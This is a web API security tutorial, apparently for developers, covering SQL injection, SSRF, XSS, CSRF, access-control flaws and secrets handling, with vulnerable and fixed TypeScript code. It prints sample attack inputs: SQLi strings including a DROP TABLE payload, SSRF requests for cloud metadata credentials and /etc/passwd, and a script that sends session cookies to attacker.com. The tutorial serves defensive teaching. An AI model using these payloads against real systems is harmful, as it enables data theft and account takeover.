Section 01

The bank vault — and why the guards are the weakest link

A bank vault has multiple entry points. The front door (public API), the staff entrance (admin interface), the courier service (outbound HTTP requests), the internal mail system (database queries), the combination written on the manager's notepad (secrets in config files). Each entry point has a guard. Each guard has a different weakness.

SQL injection is a forged signature. The document clerk reads every document that arrives and processes what the document says. An attacker crafts a document with forged text that the clerk cannot distinguish from a legitimate instruction: ' OR '1'='1. The clerk reads the entire string as an instruction, including the attacker's addition. The vault opens.

SSRF is a corrupted courier. The bank employs a courier to fetch documents from external locations. An attacker tricks the courier into fetching from an internal address — the vault's internal management console, the cloud metadata service, another bank's internal system. The courier uses its own trusted credentials to fetch from places the attacker cannot reach directly. What comes back is handed to the attacker.

XSS is a poisoned note left in the waiting room. An attacker leaves a note in the bank's public notice board (your database, via an unsanitised form). When a teller reads the notice board, the note runs a script: "send everything you can see to this address." The script executes in the teller's browser, with the teller's session cookie, with access to everything the teller can access.

Secrets mismanagement is the combination on a Post-it note. The vault combination is written on a Post-it note stuck to the vault door, photographed by someone who walked past, stored in a log file that is publicly accessible, or committed to a public Git repository. The vault is impenetrable. The combination is not.

🔒
Security is not a feature — it is the absence of specific mistakes

Most security vulnerabilities are not cases where the attacker outsmarted the defender. They are cases where the defender made a specific, well-documented mistake that has been on the OWASP Top 10 for years. SQL injection has been a top vulnerability for over two decades. The fix has been known for the same period: parameterised queries. The gap between knowing the fix and applying it consistently is where breaches happen.

Section 02

SQL injection — the vulnerability that should not exist in 2024

SQL injection occurs when user-supplied input is concatenated directly into a SQL query. The database cannot distinguish between the query structure you wrote and the SQL that the attacker injected through your input field. It executes both.

🔀 Attack

Vulnerable code:

const query = "SELECT * FROM bookings WHERE user_id = '" + userId + "'";
await db.query(query);

Attacker sends: userId = "' OR '1'='1"

Resulting query:

SELECT * FROM bookings WHERE user_id = '' OR '1'='1'

The condition '1'='1' is always true. Returns every booking in the database. Attacker reads all user data.

Worse variant: userId = "'; DROP TABLE bookings; --"
Drops the bookings table entirely if the database user has permission.

Fix — parameterised queries

Never concatenate user input into SQL. Always use parameterised queries (also called prepared statements). The database driver sends the query structure and the parameters separately — the database cannot confuse a parameter value for query syntax.

SQL injection — vulnerable vs fixedTYPESCRIPT
// VULNERABLE — never do this
const query = "SELECT * FROM bookings WHERE user_id = '" + userId + "'";
await db.query(query);

// FIXED — parameterised query (PostgreSQL / node-postgres)
const result = await db.query(
  'SELECT * FROM bookings WHERE user_id = $1',
  [userId]  // userId is a parameter, never interpreted as SQL
);

// FIXED — ORM (Prisma, TypeORM) — parameterised by default
const bookings = await prisma.booking.findMany({
  where: { userId }  // Prisma generates parameterised queries
});

// ALSO: use least-privilege database users
// The application DB user should not have DROP TABLE permission
// Even if injection occurs, damage is limited

// Defence in depth: input validation in addition to parameterisation
if (!/^[0-9a-f-]{36}$/.test(userId)) {
  return res.status(400).json({ error: 'invalid_user_id' });
}
Section 03

SSRF — making your server fetch what the attacker wants

Server-Side Request Forgery (SSRF) occurs when your server makes an HTTP request to a URL that the attacker controls. The attacker cannot make the request themselves — it would be blocked, or it requires credentials they do not have. But your server can. And your server is trusted by internal services, cloud metadata endpoints, and anything behind your VPN.

🔀 Attack

Vulnerable endpoint: POST /events/import { url: "https://external-source.com/event.json" }

Your server fetches the URL and imports the event data. This is legitimate functionality.

Attacker sends: { "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }

Your server fetches the AWS instance metadata endpoint — an address only reachable from inside the cloud environment. Returns the IAM role credentials. Attacker now has AWS credentials with whatever permissions your application role has.

Other targets: http://localhost:6379 (Redis), http://10.0.0.1/admin (internal admin), http://kubernetes.default.svc (Kubernetes API), file:///etc/passwd (local file system).

Fix — allowlist external URLs, block private ranges

Validate the URL before making the request. Block private IP ranges (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x). Use an allowlist of domains if possible. Resolve the hostname and check the resolved IP, not just the domain name — DNS rebinding can bypass hostname-only checks.

SSRF prevention — URL validationTYPESCRIPT
import dns from 'dns/promises';
import ipaddr from 'ipaddr.js';

async function isSafeUrl(urlStr: string): Promise<boolean> {
  let url: URL;
  try { url = new URL(urlStr); } catch { return false; }

  // Only allow HTTPS
  if (url.protocol !== 'https:') return false;

  // Optional: allowlist specific domains
  const ALLOWED_DOMAINS = ['trusted-partner.com', 'api.example.org'];
  if (!ALLOWED_DOMAINS.some(d => url.hostname.endsWith(d))) return false;

  // Resolve hostname and check for private IPs (DNS rebinding protection)
  const addresses = await dns.lookup(url.hostname, { all: true });
  for (const { address } of addresses) {
    const ip = ipaddr.parse(address);
    if (ip.range() !== 'unicast') return false; // blocks private, loopback, link-local
  }

  return true;
}

app.post('/events/import', authenticate, async (req, res) => {
  const { url } = req.body;
  if (!(await isSafeUrl(url))) {
    return res.status(400).json({ error: 'url_not_allowed' });
  }
  const data = await fetch(url).then(r => r.json());
  // process data...
});
🔴
IMDSv2 does not fully protect against SSRF

AWS Instance Metadata Service v2 requires a PUT request with a session token before a GET can retrieve credentials. This prevents naive SSRF that uses GET only. But some libraries and redirect-following behaviour can be exploited to satisfy the IMDSv2 requirement. IMDSv2 is a defence-in-depth measure, not a substitute for URL validation. Always validate URLs before fetching them, regardless of cloud provider protections.

Section 04

XSS and CSRF — attacking the browser, not the server

Cross-Site Scripting (XSS)

XSS occurs when user-supplied content is rendered in a browser without escaping, allowing injected JavaScript to execute in another user's browser. There are three types: stored (injected content is saved in the database and served to other users), reflected (injected content is in the URL and reflected back in the response), and DOM-based (the injection happens in client-side JavaScript). Stored XSS is the most dangerous — one successful injection affects every user who views the content.

🔀 Stored XSS Attack

Attacker posts an event with the name: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>

Your app stores this in the database. When any user views the event listing page, the script executes in their browser. Their session cookie is sent to the attacker. The attacker now has their session.

Fix: Always escape user content before rendering in HTML. React does this by default. If you are using dangerouslySetInnerHTML or server-side template rendering without escaping, you are vulnerable.

Cross-Site Request Forgery (CSRF)

CSRF tricks a user's browser into making an authenticated request to your application from a malicious website. The user is logged into your app (session cookie is set). They visit a malicious site. The malicious site contains a form that submits to POST /transfer-funds on your app. The browser attaches the session cookie automatically. Your app processes the request as legitimate.

Modern mitigations: SameSite=Strict cookies prevent the browser from sending the cookie on cross-site requests. CSRF tokens require a server-generated token in every state-changing request, which the malicious site cannot obtain. For APIs using Authorization headers (not cookies), CSRF is not a concern — cross-site requests cannot set custom headers without CORS preflight.

XSS and CSRF preventionTYPESCRIPT
// XSS: Content Security Policy header
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc:  ["'self'"],         // no inline scripts
      styleSrc:   ["'self'", "'unsafe-inline'"],
      imgSrc:     ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'"],
    },
  },
}));

// XSS: escape user content before rendering
// React: safe by default
const EventName = ({ name }) => <h1>{name}</h1>;  // auto-escaped
const EventName = ({ name }) => <h1 dangerouslySetInnerHTML={{ __html: name }} />;  // XSS risk

// Server-side: sanitise with DOMPurify (server-side) or he (HTML entities)
import he from 'he';
const safe = he.escape(userInput);  // <script> -> &lt;script&gt;

// CSRF: SameSite cookie + CSRF token
app.use(session({
  cookie: {
    sameSite: 'strict',  // browser won't send on cross-site requests
    httpOnly: true,      // not accessible to JavaScript
    secure:   true,      // HTTPS only
  }
}));
Section 05

Authentication and authorisation failures — the most impactful class

Broken authentication and broken access control consistently rank in the OWASP Top 3. They are not subtle. They are cases where the application either fails to verify who someone is, or fails to check whether who they are allows them to do what they are doing.

IDOR — Insecure Direct Object Reference

A user calls GET /bookings/12345. The server returns the booking. But does it check that booking 12345 belongs to the requesting user? If not, any authenticated user can read any booking by incrementing the ID. This is IDOR — the most common access control vulnerability, and the easiest to introduce when moving fast.

IDOR — vulnerable vs fixedTYPESCRIPT
// VULNERABLE — returns booking regardless of owner
app.get('/bookings/:id', authenticate, async (req, res) => {
  const booking = await db.findBooking(req.params.id);
  if (!booking) return res.status(404).json({ error: 'not_found' });
  res.json(booking);  // returns even if booking.userId !== req.user.id
});

// FIXED — ownership check required
app.get('/bookings/:id', authenticate, async (req, res) => {
  const booking = await db.findBooking(req.params.id);
  if (!booking) return res.status(404).json({ error: 'not_found' });

  // Check ownership (or admin role)
  if (booking.userId !== req.user.id && !req.user.roles.includes('admin')) {
    return res.status(403).json({ error: 'forbidden' });
    // Note: 404 is also acceptable — reveals nothing about resource existence
  }
  res.json(booking);
});

Mass assignment

Mass assignment occurs when user-supplied JSON is passed directly to a database update without filtering which fields can be updated. If a user sends { "name": "Alice", "role": "admin" } to a profile update endpoint, and the endpoint does db.update(req.body), the user just promoted themselves to admin. Always use an explicit allowlist of updateable fields.

Mass assignment preventionTYPESCRIPT
// VULNERABLE
app.put('/users/:id', authenticate, async (req, res) => {
  await db.updateUser(req.params.id, req.body); // updates ANY field
});

// FIXED — explicit allowlist
app.put('/users/:id', authenticate, async (req, res) => {
  const { name, email, phoneNumber } = req.body; // only these fields
  await db.updateUser(req.params.id, { name, email, phoneNumber });
});

// BETTER — schema validation with Zod
const UpdateUserSchema = z.object({
  name:        z.string().min(1).max(100).optional(),
  email:       z.string().email().optional(),
  phoneNumber: z.string().regex(/^\+\d{10,15}$/).optional(),
  // role, isAdmin, etc. are NOT in the schema
});

app.put('/users/:id', authenticate, async (req, res) => {
  const updates = UpdateUserSchema.parse(req.body); // throws on unknown fields
  await db.updateUser(req.params.id, updates);
});
Section 06

Secrets management — the combination on the Post-it note

Secrets (database passwords, API keys, JWT private keys, payment provider credentials) are the most sensitive data your application handles. They are also routinely mishandled in ways that are entirely preventable.

The three ways secrets leak

Committed to Git: The most common. A developer puts a real key in .env or a config file and commits it. The commit is pushed to a public (or semi-public) repository. GitHub's secret scanning will alert — eventually. But the commit is in the history forever, and automated scanners harvest exposed keys within minutes of a push. Tools: git-secrets, Gitleaks as a pre-commit hook, GitHub secret scanning enabled.

Logged by the application: An error handler logs JSON.stringify(config) or an ORM logs the database connection string including the password. The log is shipped to a logging service that is less secured than the secret store. Fix: never log configuration objects, sanitise error messages before logging, use structured logging with explicit field inclusion.

Stored in environment variables that leak: Environment variables are accessible to all processes, are included in crash dumps, and sometimes appear in error messages. A child process spawned by your app inherits all environment variables. A third-party APM agent may capture environment state on errors. Use a secrets manager (AWS Secrets Manager, HashiCorp Vault, GCP Secret Manager) and fetch secrets at runtime rather than injecting them as environment variables where possible.

Secrets management — fetch at runtimeTYPESCRIPT
import { SecretsManagerClient, GetSecretValueCommand } from '@aws-sdk/client-secrets-manager';

const secretsClient = new SecretsManagerClient({ region: 'ap-south-1' });

async function getSecret(secretName: string): Promise<string> {
  const command = new GetSecretValueCommand({ SecretId: secretName });
  const response = await secretsClient.send(command);
  return response.SecretString!;
}

// At startup, fetch secrets and store in memory (not env vars)
let secrets: { databaseUrl: string; stripeKey: string };

export async function initSecrets() {
  const [databaseUrl, stripeKey] = await Promise.all([
    getSecret('production/booking-service/database-url'),
    getSecret('production/booking-service/stripe-key'),
  ]);
  secrets = { databaseUrl, stripeKey };
}

// Never log secrets — sanitise error output
process.on('uncaughtException', (err) => {
  // Log error message and stack, NOT err.config or process.env
  logger.error({ message: err.message, stack: err.stack });
});
🔴
Rotating a leaked secret is not optional

When a secret is exposed — in a git commit, a log file, an error message — it must be rotated immediately. Not soon. Not in the next sprint. Immediately. Assume the secret has already been used by an attacker. Rotate it, audit the logs for anomalous usage of the credentials during the exposure window, and understand how it leaked to prevent recurrence. A secret that is rotated within minutes of exposure is usually not exploited. A secret that sits exposed for days almost certainly is.

Section 07

Security headers — five lines that harden your API

HTTP response headers can instruct browsers to enforce security policies that protect your users even when your application code has gaps. These are free to add, take minutes to configure, and meaningfully reduce your attack surface.

Security headers with Helmet.jsTYPESCRIPT
import helmet from 'helmet';

app.use(helmet({
  // Prevents browsers from sniffing content type
  contentTypeOptions: true,  // X-Content-Type-Options: nosniff

  // Prevents clickjacking — embedding your page in an iframe
  frameguard: { action: 'deny' },  // X-Frame-Options: DENY

  // Forces HTTPS for 1 year (including subdomains)
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true,
  },  // Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

  // Restricts what resources the browser can load
  contentSecurityPolicy: {
    directives: {
      defaultSrc:  ["'self'"],
      scriptSrc:   ["'self'"],
      styleSrc:    ["'self'", "'unsafe-inline'"],
      imgSrc:      ["'self'", 'data:', 'https:'],
      connectSrc:  ["'self'"],
      fontSrc:     ["'self'"],
      objectSrc:   ["'none'"],
      frameAncestors: ["'none'"],
    },
  },

  // Prevents referrer leakage on cross-origin requests
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
}));

// For pure APIs (no browser rendering): simpler CSP
// Content-Security-Policy: default-src 'none'
⚠️
Test CSP in report-only mode first

A Content Security Policy that is too restrictive will break your application — legitimate scripts and styles will be blocked. Before enforcing CSP, use Content-Security-Policy-Report-Only with a report URI. This logs violations without blocking them. Review the violations for a week, refine the policy, then switch to enforcement. Deploying a restrictive CSP cold will cause production incidents for every legitimate resource your policy blocks.

Section 08

Production reality

Dependency scanning in CI

Your application code may be clean, but your dependencies may not be. A critical vulnerability in a transitive dependency (something your dependency depends on) can make your application exploitable without any change to your own code. Run npm audit or snyk test in CI on every push. Configure your pipeline to fail on high-severity vulnerabilities. Subscribe to security advisories for your key dependencies. When Log4Shell dropped, teams with automated dependency scanning had hours to react; teams without it found out when their systems were being exploited.

Rate limiting on every public endpoint

Without rate limiting, your API accepts unlimited requests from any IP. Brute force attacks on passwords, credential stuffing, and automated vulnerability scanning all depend on being able to make many requests quickly. Apply rate limiting at the API gateway level (not application code — the application should not have to process requests it will reject). Limits: 10 login attempts per minute per IP, 100 requests per minute per authenticated user for most endpoints, stricter on payment and account-change endpoints.

OWASP Top 10 is not a compliance exercise

Teams sometimes treat OWASP Top 10 as a checklist to tick before a security audit. The list exists because these are the attacks that succeed most frequently in real environments. SQL injection has been on the list since the list was created. It is still there because applications are still vulnerable to it. Running through the list once a year is insufficient — integrate security review into the development process: threat modelling when designing features, SAST in CI, and manual penetration testing before major launches.

Section 09

The things nobody tells you

Security regressions are the most common security problem

Most teams focus security effort on the initial implementation — adding parameterised queries, setting up helmet, reviewing the auth flow. The vulnerability that causes the breach is often introduced six months later, in a hurry, by a developer who did not know the pattern was important. Parameterised queries in 95% of the codebase does not help if one endpoint uses string concatenation. Security regression tests — automated tests that specifically test for known vulnerabilities in your codebase — prevent this. For each vulnerability class you fix, add a test that would have caught it.

WAF is not a substitute for fixing the vulnerability

A Web Application Firewall can block many common attack patterns. It is valuable as defence in depth. It is not a reason to keep vulnerable code in production. WAFs can be bypassed by attackers who understand the rules. They generate false positives that block legitimate traffic. They add latency. A WAF in front of SQLi-vulnerable code is not secure — it is a door with a lock that the attacker might be able to pick. Fix the vulnerability. Add the WAF. Do not choose one instead of the other.

Logging PII is a security problem

Request logging that includes full request bodies often inadvertently captures credit card numbers, passwords, national IDs, and health information. Log files are often less protected than production databases. They are sent to third-party services (Datadog, Splunk) that may have different security postures. Audit what your logs capture. Scrub PII before logging: mask card numbers (****-****-****-1234), omit password fields, redact national IDs. Treat your logs as a potential breach surface.

The most dangerous attack surface is your own employees

Phishing, credential theft, and insider threats account for more breaches than technical vulnerabilities. Your perfectly secure API is worthless if an attacker has the credentials of an engineer with production database access. Enforce MFA on every account with production access. Use short-lived credentials (AWS SSO, Vault lease-based secrets). Require break-glass procedures for direct database access. Log all privileged access. The perimeter is not your API — it is every human who has access to your systems.

Security checklist

Minimum viable security for a new service

These are the controls that prevent the most common breaches. Not optional.

1
Parameterised queries — every database call
No string concatenation in SQL. Use parameterised queries or an ORM that generates them. Run a SAST tool (Semgrep, CodeQL) configured to flag string-concatenated queries. Test with a SQLi payload against your own endpoints before shipping.
one unparameterised query = entire database accessible
2
Validate and block outbound URLs
Any endpoint that accepts a URL and fetches it must validate the URL before fetching. Block private IP ranges, loopback, and link-local addresses. Use an allowlist of domains if the use case permits. Resolve the hostname before checking — do not trust the domain name alone against DNS rebinding.
unvalidated outbound URL = SSRF = internal service access
3
Ownership check on every resource endpoint
For every endpoint that returns or modifies a resource by ID, verify that the requesting user owns or is authorised to access that specific resource. Not just "is this user authenticated" but "is this authenticated user allowed to access this specific resource." Add a test that accesses user A's resource with user B's token — it must return 403.
missing ownership check = any user reads any user's data
4
Secrets in a secrets manager, not in env vars or code
Database passwords, API keys, private keys — all in AWS Secrets Manager, HashiCorp Vault, or equivalent. Never in .env files committed to git, never in environment variables that appear in logs, never hardcoded. Add a pre-commit hook (Gitleaks, git-secrets) that prevents secret patterns from being committed.
secret in git = secret is public
5
Security headers on every response
helmet() in Express or equivalent. HSTS (force HTTPS), CSP (control what the browser loads), X-Frame-Options (prevent clickjacking), X-Content-Type-Options (prevent MIME sniffing). Test with securityheaders.com or Mozilla Observatory. These take 5 minutes to add and address an entire class of browser-based attacks.
helmet() = 5 minutes → eliminates class of browser attacks
6
Rate limiting on auth and sensitive endpoints
Login, password reset, token refresh: 10 requests per minute per IP, lockout after 5 failures per account. Payment and high-value actions: 20 requests per minute per authenticated user. Enforce at the API gateway or load balancer — not in application code. Monitor for sustained high-rate requests from single IPs as an anomaly signal.
rate limiting = brute force takes years, not hours
